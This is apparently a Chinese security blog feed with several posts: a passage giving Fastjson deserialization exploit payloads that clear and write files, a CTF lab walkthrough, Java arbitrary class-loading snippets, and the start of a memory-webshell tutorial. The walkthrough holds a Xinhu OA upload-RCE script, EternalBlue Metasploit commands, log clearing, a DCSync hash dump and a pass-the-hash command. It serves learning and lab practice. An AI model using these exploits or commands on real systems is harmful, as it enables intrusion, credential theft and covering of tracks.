<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> org.eclipse.core.internal.localstore.SafeFileOutputStream;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp5</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;,\&quot;@type\&quot;:\&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;,\&quot;tempPath\&quot;:\&quot;D:/desktop/flag1.txt\&quot;,\&quot;targetPath\&quot;:\&quot;D:/desktop/flag.txt\&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parseObject(json);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/ab4b97db/20260131155950459.png" alt="image.png"><br>flag1的内容会被清空</p>
<h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><p>这里找到的是：<strong>com.esotericsoftware.kryo.io.Output</strong><br>依赖包</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.esotericsoftware<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>kryo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/posts/ab4b97db/20260131164149314.png" alt="image.png"><br>output类主要是用来写内容的这里的setOutputStream和setBuffer方法可写入输入流，buffer是文件的内容，这里的outputstream就相当于前面提到的SafeFileOutputStream对象（对文件在物理层面进行写入），要触发对文件内容的写入就要调用到flush函数<br><img src="/posts/ab4b97db/20260131164820482.png" alt="image.png"><br>在这个类中，close和require对flush方法进行了调用，我们选择require这个方法，因为write方法对require方法进行了调用，这里我们在去找谁调用了write方法，这里我们找到了ObjectOutputStream的一个内部类，BlockDataOutputStream这个类<br><img src="/posts/ab4b97db/20260131195642801.png" alt="image.png"><br>构造方法中，OutputStream类型参数赋值给out成员变量，setBlockDataMode方法中调用了drain方法<br><img src="/posts/ab4b97db/20260131195935785.png" alt="image.png"><br>然后调用了write方法，那么谁有调用了setBlockDataMode()函数<br><img src="/posts/ab4b97db/20260131200520857.png" alt="image.png"><br>ObjectOutputStream中就存在，但是这是一个有参的构造方法，在fastjson中优先获取的是ObjectOutputStream的无参构造方法，所以只能找子类来触发了，类名：<strong>com.sleepycat.bind.serial.SerialOutput</strong><br>依赖包</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sleepycat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>je<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.0.73<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/posts/ab4b97db/20260131215039782.png" alt="image.png"><br>exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;  </span><br><span class="line"><span class="keyword">import</span> com.sleepycat.bind.serial.SerialOutput;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp4</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;stream\&quot;:&#123;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;targetPath\&quot;:\&quot;D:/desktop/flag.txt\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;tempPath\&quot;:\&quot;D:/desktop/flag1.txt\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#125;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;writer\&quot;:&#123;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.esotericsoftware.kryo.io.Output\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;buffer\&quot;:\&quot;YWJjZGU=\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;outputStream\&quot;:&#123;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;$ref\&quot;:\&quot;$.stream\&quot;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#125;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;position\&quot;:5&quot;</span> + <span class="comment">//指定长度  </span></span><br><span class="line">                <span class="string">&quot;&#125;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;close\&quot;:&#123;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.sleepycat.bind.serial.SerialOutput\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;out\&quot;:&#123;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;$ref\&quot;:\&quot;$.writer\&quot;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parseObject(json);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/ab4b97db/20260131225305653.png" alt="image.png"><br>结合exp理解一下上述分析。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">Java反序列化Fastjson篇04-Fastjson1.2.62-1.2.68版本反序列化漏洞 | Drunkbaby’s Blog</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>Fastjson</category>
      </categories>
  </entry>
  <entry>
    <title>initial</title>
    <url>/posts/be271daf/</url>
    <content><![CDATA[<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>第一步用tscan扫描指纹发现是thinkphp</p>
<p>然后直接getshell</p>
<p><img src="/posts/be271daf/1763030292648-41c97f16-6423-4f28-b9b4-ec077dd92ff7.png" alt="img"></p>
<p>蚁剑连接后<code>sudo -l</code>发现mysql提权</p>
<p><img src="/posts/be271daf/1763030327476-35a1fbe8-d9e3-48b2-9c2d-73b2f1bc1c81.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mysql -e &#x27;\! find / -type f -name &quot;*flag*&quot; 2&gt;/dev/null&#x27;</span><br></pre></td></tr></table></figure>

<p>然后得到flag1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;60b53231-</span><br></pre></td></tr></table></figure>



<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>传入fscan来扫描一下内网</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fscan -h</span><br></pre></td></tr></table></figure>

<p>然后用stowaway做一个内网穿透</p>
<p><img src="/posts/be271daf/1763030466924-7c488bd8-b12a-45b9-8d03-a508a607ac36.png" alt="img"></p>
<p>弱口令可以进入到这里</p>
<p>然后是信呼协同办公2.2版本的文件上传</p>
<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">url_pre = &#x27;http://url/&#x27;</span><br><span class="line">url1 = url_pre + &#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span><br><span class="line">url2 = url_pre + &#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span><br><span class="line">url3 = url_pre + &#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    &#x27;rempass&#x27;: &#x27;0&#x27;,</span><br><span class="line">    &#x27;jmpass&#x27;: &#x27;false&#x27;,</span><br><span class="line">    &#x27;device&#x27;: &#x27;1625884034525&#x27;,</span><br><span class="line">    &#x27;ltype&#x27;: &#x27;0&#x27;,</span><br><span class="line">    &#x27;adminuser&#x27;: &#x27;dGVzdA::&#x27;,</span><br><span class="line">    &#x27;adminpass&#x27;: &#x27;YWJjMTIz&#x27;,</span><br><span class="line">    &#x27;yanzm&#x27;: &#x27;&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;&#x27;file&#x27;: open(&#x27;1.php&#x27;, &#x27;r+&#x27;)&#125;)</span><br><span class="line"></span><br><span class="line">filepath = str(r.json()[&#x27;filepath&#x27;])</span><br><span class="line">filepath = &quot;/&quot; + filepath.split(&#x27;.uptemp&#x27;)[0] + &#x27;.php&#x27;</span><br><span class="line">id = r.json()[&#x27;id&#x27;]</span><br><span class="line"></span><br><span class="line">url3 = url_pre + f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&#123;id&#125;&#x27;</span><br><span class="line"></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath + &quot;?1=system(&#x27;whoami&#x27;);&quot;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<p>记得改账户密码</p>
<p><img src="/posts/be271daf/1763032352601-b78c38f0-cc53-4414-9f93-cd22731d7f4f.png" alt="img"></p>
<p>蚁剑连接上，查看flag2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2ce3-4813-87d4-</span><br></pre></td></tr></table></figure>





<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p><img src="/posts/be271daf/1763033501282-09189c88-7265-4a35-b0d5-9303c53f9bbc.png" alt="img"></p>
<p>我们可以试一下永恒之蓝</p>
<p>配置好kali的代理</p>
<p>启动msf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 msfconsole</span><br></pre></td></tr></table></figure>

<p>选好模块，配置好ip进行攻击</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line">set RHOSTS 172.22.1.21</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="/posts/be271daf/1763033870150-8c136c59-c856-4311-be23-d6687aef813b.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; screenshot # 捕获屏幕</span><br><span class="line">meterpreter &gt; upload hello.txt c:// #上传文件</span><br><span class="line">meterpreter &gt; download d://1.txt # 下载文件</span><br><span class="line">meterpreter &gt; shell # 获取cmd</span><br><span class="line">meterpreter &gt; clearev # 清除日志</span><br></pre></td></tr></table></figure>

<p>这里是一些命令</p>
<p>但是这里没有flag，还有一个可利用的点就是</p>
<p><img src="/posts/be271daf/1763034191041-7e2ae01c-b7db-4917-bd4c-587e32525ecf.png" alt="img"></p>
<p>这里有一个dc的域控制器，需要打DCSync</p>
<p>这里直接贴一位佬的介绍了</p>
<p><img src="/posts/be271daf/1763034294501-4a1d9fda-6b6b-4eaa-a692-dd65b5a7f174.png" alt="img"><img src="/posts/be271daf/1763034459993-bf664c0b-450f-4174-8e66-db8f54eef974.png" alt="img"></p>
<p>这里我们符合条件打dcsync，输入一下命令获取用户的hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load kiwi  # 调用mimikatz模块</span><br><span class="line">kiwi_cmd &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; exit  # 导出域内所有用户的信息(包括哈希值)</span><br></pre></td></tr></table></figure>

<p><img src="/posts/be271daf/1763034576733-c415664b-8055-45e1-9a20-16236df7358c.png" alt="img"></p>
<p>获取到用户的hash</p>
<p>接下来我们需要使用crackmapexec来进行哈希传递攻击，从而实现在dc域控上的任意命令执行来获得flag3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/be271daf/1763034800871-2fc3e88f-20d3-4e95-a5d7-15aac8e6cfbb.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;60b53231-2ce3-4813-87d4-e8f88d0d43d6&#125;</span><br></pre></td></tr></table></figure>

<p>参考：<a href="https://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/index.html">https://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/index.html</a></p>
]]></content>
      <categories>
        <category>src</category>
        <category>打靶</category>
      </categories>
  </entry>
  <entry>
    <title>java任意类加载</title>
    <url>/posts/933a52e3/</url>
    <content><![CDATA[<h2 id="三种方法的任意类加载"><a href="#三种方法的任意类加载" class="headerlink" title="三种方法的任意类加载"></a>三种方法的任意类加载</h2><p>第一种方法</p>
<p>使用URLClassLoder类进行任意类加载，具体实现如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">URLClassLoader urlClassLoader = new URLClassLoader(new URL[]&#123;new URL(&quot;file:///D:\\tmp\\&quot;)&#125;);//http也是可以的</span><br><span class="line">       Class&lt;?&gt; c = urlClassLoader.loadClass(&quot;test&quot;);</span><br><span class="line">       c.newInstance();</span><br><span class="line"></span><br><span class="line">       //URLClassLoader 任意类加载</span><br></pre></td></tr></table></figure>

<p>第二种方法</p>
<p>使用ClassLoader里的defineClass方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//不用出网</span><br><span class="line">        ClassLoader cl = ClassLoader.getSystemClassLoader();</span><br><span class="line"></span><br><span class="line">        Method cname = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);</span><br><span class="line">        cname.setAccessible(true);</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\tmp\\test.class&quot;)); //将 D:\tmp\test.class 这个文件的全部内容读取到一个字节数组 code 中。</span><br><span class="line">        Class cc = (Class) cname.invoke(cl,&quot;test&quot;,code,0,code.length);//第三个参数是起始位置,返回的是test类的Class对象，类型是object要强转为Class（类的元数据对象）</span><br><span class="line"></span><br><span class="line">        cc.newInstance();</span><br><span class="line">        //defineclass 任意类加载</span><br></pre></td></tr></table></figure>

<p>第三种方法</p>
<p>使用unsafe里的defineClass方法</p>
<p><img src="/posts/933a52e3/1756437168932-38563358-0613-4c44-9412-68072414b231.png" alt="img"></p>
<p>主要是这边获取到属性theUnsafe的值就得到了实列化的Unsafe可以任意调用方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ClassLoader cl = ClassLoader.getSystemClassLoader();</span><br><span class="line">        Class c = Unsafe.class;</span><br><span class="line">        Field f = c.getDeclaredField(&quot;theUnsafe&quot;);</span><br><span class="line">        f.setAccessible(true);</span><br><span class="line">        Unsafe unsafe = (Unsafe) f.get(null); //获取值 new Unsafe()</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\tmp\\test.class&quot;));</span><br><span class="line">        Class u = unsafe.defineClass(&quot;test&quot;,code,0,code.length,cl,null);</span><br><span class="line">        u.newInstance();</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>java基础</category>
      </categories>
  </entry>
  <entry>
    <title>java内存马_1</title>
    <url>/posts/6e2cfed1/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>还是打算先把内存马学一下，然后在学学java的代码审计，从tomcat架构开始学习。</p>
<h1 id="java-web三大件"><a href="#java-web三大件" class="headerlink" title="java web三大件"></a>java web三大件</h1><p>java web的三大件是Servlet、Filter、Listener。<br>当tomcat接收到请求的时候，会依次经过Listener-》Filter-》Serlvet</p>
<h2 id="Servlet（执行者）"><a href="#Servlet（执行者）" class="headerlink" title="Servlet（执行者）"></a>Servlet（执行者）</h2><p>Java Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。<br>Servlet的架构如下图所示：<br><img src="/posts/6e2cfed1/20260206123836465.png" alt="image.png"><br>简单的聊一下它的作用: 处理具体的业务逻辑（处理客户端的请求）、读写数据库、返回HTML或json数据（响应）。</p>
<h2 id="Servlet的三种创建方式"><a href="#Servlet的三种创建方式" class="headerlink" title="Servlet的三种创建方式"></a>Servlet的三种创建方式</h2><h3 id="第一种方法实现Servlet接口"><a href="#第一种方法实现Servlet接口" class="headerlink" title="第一种方法实现Servlet接口"></a>第一种方法实现Servlet接口</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(urlPatterns = &quot;/demo1&quot;)</span>  </span><br><span class="line"><span class="comment">//第一种方法实现Servlet接口  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Servletdemo1</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;  </span><br><span class="line">    <span class="comment">//初始化，当Servlet第一次被创建的时候执行这个方法，这个方法在整个生命周期中只执行一次。  </span></span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Servlet Create&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//Servlet获取初始化的配置信息  </span></span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">//对客户端响应的方法，每发送一次请求这个方法就会被执行一次  </span></span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;service run&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">//当Servlet被销毁时执行改方法  </span></span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看一下具体的实现。<br>访问demo01<br><img src="/posts/6e2cfed1/20260206133843557.png" alt="image.png"><br><img src="/posts/6e2cfed1/20260206133859215.png" alt="image.png"><br>看一下控制台的输出，没刷新一次run一次而Create只执行一次</p>
<h3 id="第二种方法继承GenericServlet-类"><a href="#第二种方法继承GenericServlet-类" class="headerlink" title="第二种方法继承GenericServlet 类"></a>第二种方法继承GenericServlet 类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.GenericServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(urlPatterns = &quot;/demo2&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Servletdemo2</span> <span class="keyword">extends</span> <span class="title class_">GenericServlet</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Servletdemo2&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/6e2cfed1/20260206134524418.png" alt="image.png"><br>这种方法比较少用</p>
<h3 id="第三种方法继承HttpServlet"><a href="#第三种方法继承HttpServlet" class="headerlink" title="第三种方法继承HttpServlet"></a>第三种方法继承HttpServlet</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(urlPatterns = &quot;/demo3&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Servletdemo3</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Servletdemo3 GET&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException&#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Servletdemo3 POST&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/6e2cfed1/20260206135904306.png" alt="image.png"><br>这种方法也是常用的创建Servlet的方法<br>doxxxx方法就是跟着我们具体的业务逻辑走的</p>
<h2 id="Filter（守门员）"><a href="#Filter（守门员）" class="headerlink" title="Filter（守门员）"></a>Filter（守门员）</h2><p>Filter程序实现了特殊接口的Java类，与servlet类似，也是由servlet容器进行调用和执行的。<br>其主要功能是在HttpServletRequest到达Servlet之前，对其进行拦截和检查，也可以对HttpServletRequest的头和数据进行更改。也会在HttpServletResponse到达客户端之前，对其进行拦截和检查，当然也可以对他的头和数据进行更改。</p>
<h3 id="Filter工作的基本原理"><a href="#Filter工作的基本原理" class="headerlink" title="Filter工作的基本原理"></a>Filter工作的基本原理</h3><ul>
<li>1、Filter 程序是一个实现了特殊接口的 Java 类，与 Servlet 类似，也是由 Servlet 容器进行调用和执行的。</li>
<li>2、当在 web.xml 注册了一个 Filter 来对某个 Servlet 程序进行拦截处理时，它可以决定是否将请求继续传递给 Servlet 程序，以及对请求和响应消息是否进行修改。</li>
<li>3、当 Servlet 容器开始调用某个 Servlet 程序时，如果发现已经注册了一个 Filter 程序来对该 Servlet 进行拦截，那么容器不再直接调用 Servlet 的 service 方法，而是调用 Filter 的 doFilter 方法，再由 doFilter 方法决定是否去激活 service 方法。</li>
<li>4、但在 Filter.doFilter 方法中不能直接调用 Servlet 的 service 方法，而是调用 FilterChain.doFilter 方法来激活目标 Servlet 的 service 方法，FilterChain 对象时通过 Filter.doFilter 方法的参数传递进来的。</li>
<li>5、只要在 Filter.doFilter 方法中调用 FilterChain.doFilter 方法的语句前后增加某些程序代码，这样就可以在 Servlet 进行响应前后实现某些特殊功能。</li>
<li>6、如果在 Filter.doFilter 方法中没有调用 FilterChain.doFilter 方法，则目标 Servlet 的 service 方法不会被执行，这样通过 Filter 就可以阻止某些非法的访问请求。<br>总结: Filter访问需要在web.xml里定义路径，然后一般的Fileter中是由一条filterchain组成的，也就是是由多个filter组成的，而service在最后一个Filter中执行。当然如果没有FilterChain的话最终就不会调用到service方法。可以看下图。<br><img src="/posts/6e2cfed1/20260206153125494.png" alt="image.png"><br>如果在Filter之前在添加一个filter，这个filter中有我们写的恶意代码，那么，当我们发送请求的时候，就会提前调用恶意的filter，导致命令的执行。</li>
</ul>
<h3 id="Filter的创建"><a href="#Filter的创建" class="headerlink" title="Filter的创建"></a>Filter的创建</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebFilter(urlPatterns = &quot;/demo4&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Filterdemo</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;  </span><br><span class="line">    <span class="comment">//初始化  </span></span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;init&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;  </span><br><span class="line">        <span class="comment">//拦截  </span></span><br><span class="line">        System.out.println(<span class="string">&quot;request go&quot;</span>);  </span><br><span class="line">        <span class="comment">//放行，只有有它才能到Servlet  </span></span><br><span class="line">        chain.doFilter(request, response);  </span><br><span class="line">        System.out.println(<span class="string">&quot;response 